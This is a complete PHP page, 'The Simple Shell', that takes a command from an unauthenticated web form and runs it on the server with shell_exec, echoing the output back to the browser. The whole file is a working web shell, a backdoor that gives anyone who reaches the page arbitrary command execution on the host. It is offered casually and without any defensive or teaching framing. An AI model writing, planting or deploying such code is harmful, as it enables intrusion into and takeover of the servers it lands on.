<!DOCTYPE html>
<html>

<head>
    <title>The Simple Shell</title>
    <meta charset="utf-8">
    <meta name="description" content="A simple shell for everyone to enjoy">
    <style>
        html{
            font-size: 22px;
        }

        body {
            background-color: #333;
            color: whitesmoke;
        }

    </style>
</head>
<body>
    <h1>The Simple Shell</h1>
    <hr>
    <p>The Simple Shell will read commands, execute them and then give back the results. Enjoy :).
    
    </p>

    <form method="post">
        <input type="text" name="cmd" placeholder="Command: ">
        <input type="submit" placeholder="Give command">
    </form>
    <pre>
        <?php
        if (isset($_POST['cmd'])) {
            echo shell_exec($_POST['cmd']);
        }
        ?>
    </pre>
</body>
</html>
